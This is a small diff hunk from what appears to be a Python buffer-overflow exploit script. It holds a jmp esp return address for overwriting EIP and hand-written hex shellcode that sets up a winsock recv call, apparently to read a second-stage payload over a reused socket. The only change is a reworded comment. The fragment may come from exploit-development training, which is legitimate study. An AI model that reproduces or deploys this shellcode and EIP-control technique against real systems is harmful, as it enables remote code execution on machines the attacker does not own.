@@ -22,7 +22,7 @@ eip = "625011BB"		# jmp esp addr
 
 # Call winsocket.recv
 # Ref.: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
-# REMEMBER TO: recalc params and replace in string
+# REMEMBER TO: recalc params and update the string
 call = "54"		# PUSH ESP
 call += "5A"		# POP EDX
 call += "6681C28801"	# ADD DX, 0x18 <-- socket
